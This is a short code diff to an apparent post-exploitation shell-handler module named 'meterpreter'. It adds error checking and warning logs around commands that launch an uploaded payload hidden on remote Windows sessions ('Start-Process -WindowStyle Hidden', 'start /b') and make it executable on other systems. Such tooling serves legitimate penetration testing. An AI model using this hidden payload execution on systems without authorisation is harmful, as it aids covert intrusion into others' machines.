@@ -955,9 +955,15 @@ class meterpreter(Module):
 
 			if session.OS == 'Windows':
 				if session.subtype == 'psh':
-					session.exec(f'Start-Process -WindowStyle Hidden "{uploaded_path[0]}"')
+					response = session.exec(f'Start-Process -WindowStyle Hidden "{uploaded_path[0]}"', value=True)
+					if response and 'Start-Process :' in response:
+						logger.warning(f"Payload launch failed: {response.strip()}")
 				else:
-					session.exec(f'start /b "" "{uploaded_path[0]}"')
+					response = session.exec(f'start /b "" "{uploaded_path[0]}"', value=True)
+					if response and ('cannot find' in response.lower()
+						or 'is not recognized' in response.lower()
+						or 'access is denied' in response.lower()):
+						logger.warning(f"Payload launch failed: {response.strip()}")
 			else:
 				q = shlex.quote(uploaded_path[0])
 				session.exec(f'chmod +x {q}')
